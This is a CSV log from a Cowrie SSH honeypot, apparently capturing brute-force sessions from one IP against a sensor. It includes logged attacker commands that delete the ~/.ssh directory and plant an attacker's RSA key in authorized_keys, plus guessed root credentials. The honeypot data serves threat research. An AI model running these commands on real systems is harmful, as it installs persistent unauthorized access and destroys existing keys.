eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.session.connect,140.246.228.50,33014,172.233.154.19,2222,de94cf0c49e2,ssh,,,,New connection: 140.246.228.50:33014 (172.233.154.19:2222) [session: de94cf0c49e2],localhost,2024-12-01T00:00:01.735181Z
cowrie.client.version,140.246.228.50,,,,de94cf0c49e2,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:00:01.741346Z
cowrie.client.kex,140.246.228.50,,,,de94cf0c49e2,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:00:01.926039Z
cowrie.login.success,140.246.228.50,,,,de94cf0c49e2,,,,,login attempt [root/Aa111111.] succeeded,localhost,2024-12-01T00:00:02.654465Z
cowrie.session.params,140.246.228.50,,,,de94cf0c49e2,,,,,[],localhost,2024-12-01T00:00:03.052754Z
cowrie.command.input,140.246.228.50,,,,de94cf0c49e2,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-12-01T00:00:03.054181Z
cowrie.command.failed,140.246.228.50,,,,de94cf0c49e2,,,,,Command not found: lockr -ia .ssh,localhost,2024-12-01T00:00:03.054855Z
cowrie.log.closed,140.246.228.50,,,,de94cf0c49e2,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-12-01T00:00:03.456688Z
cowrie.session.params,140.246.228.50,,,,de94cf0c49e2,,,,,[],localhost,2024-12-01T00:00:03.667785Z
cowrie.command.input,140.246.228.50,,,,de94cf0c49e2,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-12-01T00:00:03.668270Z
cowrie.session.file_download,140.246.228.50,,,,de94cf0c49e2,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-12-01T00:00:03.854335Z
cowrie.log.closed,140.246.228.50,,,,de94cf0c49e2,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-12-01T00:00:03.855287Z
cowrie.session.connect,140.246.228.50,33554,172.233.154.19,2222,a3e656b99ae8,ssh,,,,New connection: 140.246.228.50:33554 (172.233.154.19:2222) [session: a3e656b99ae8],localhost,2024-12-01T00:00:04.026994Z
cowrie.client.version,140.246.228.50,,,,a3e656b99ae8,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:00:04.029938Z
cowrie.client.kex,140.246.228.50,,,,a3e656b99ae8,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:00:04.207322Z
cowrie.login.failed,140.246.228.50,,,,a3e656b99ae8,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-12-01T00:00:04.916066Z
cowrie.session.closed,140.246.228.50,,,,a3e656b99ae8,,,,,Connection lost after 2 seconds,localhost,2024-12-01T00:00:06.094419Z
cowrie.session.connect,140.246.228.50,34286,172.233.154.19,2222,18da3f35d138,ssh,,,,New connection: 140.246.228.50:34286 (172.233.154.19:2222) [session: 18da3f35d138],localhost,2024-12-01T00:00:06.256085Z
